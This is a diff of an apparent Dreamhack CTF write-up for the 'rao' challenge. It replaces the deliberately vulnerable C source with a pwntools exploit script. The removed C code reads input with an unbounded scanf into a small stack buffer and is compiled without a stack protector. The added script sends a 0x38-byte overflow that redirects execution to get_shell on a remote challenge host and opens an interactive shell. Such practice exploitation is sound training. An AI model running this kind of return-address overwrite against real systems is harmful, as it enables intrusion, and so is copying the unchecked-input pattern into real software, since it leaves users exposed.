@@ -26,32 +26,41 @@
 
 ## Script
 ```
-// Name: rao.c
-// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie
+#!/usr/bin/env python3
 
-#include <stdio.h>
-#include <unistd.h>
+from pwn import *
 
-void init() {
-  setvbuf(stdin, 0, 2, 0);
-  setvbuf(stdout, 0, 2, 0);
-}
+exe = ELF('rao', checksec=False)
+# libc = ELF('', checksec=False)
+context.binary = exe
 
-void get_shell() {
-  char *cmd = "/bin/sh";
-  char *args[] = {cmd, NULL};
+info = lambda msg: log.info(msg)
+s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
+sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
+sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
+sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
+sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
+sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
+sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
+slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
 
-  execve(cmd, args, NULL);
-}
 
-int main() {
-  char buf[0x28];
+        c
+        ''')
+        input()
 
-  init();
 
-  printf("Input: ");
-  scanf("%s", buf);
+if args.REMOTE:
+    p = remote('host3.dreamhack.games', 23646)
+else:
+    p = process([exe.path])
+GDB()
 
-  return 0;
-}
+payload = b'A'*0x38 + p64(exe.sym['get_shell'])
+sla(b'Input: ', payload)
+
+p.interactive()
 ```
